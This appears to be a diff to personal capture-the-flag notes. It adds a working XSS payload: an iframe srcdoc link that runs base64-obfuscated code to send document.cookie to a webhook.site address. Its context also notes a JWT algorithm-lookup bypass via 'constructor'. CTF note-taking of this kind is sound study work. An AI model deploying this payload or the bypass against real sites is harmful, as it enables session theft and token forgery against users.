@@ -25,7 +25,13 @@ const algorithms = {
 `const signature = algorithms[header.alg.toLowerCase()](data, secret);` is vulnerable to ["constructor"], calling the array constructor with the params -> results in an arr of dicts
 const calculated_buf = Buffer.from(calculated_signature, 'base64'); casts everything to a primitive -> arr of dict gets "stringified"
 
-
+### blink
+#xss 
+popover框架
+```html
+<iframe srcdoc="<a id=togglePopover href='cid:eval(atob(`ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2RjZTFiNmZjLTQ1M2MtNDI1Zi1hY2MyLTAwNTFkY2Y4NWMxOD8nK2RvY3VtZW50LmNvb2tpZSk`))'></a>" name="body"></iframe>
+```
+### eeeeejs
 
 # reverse
 
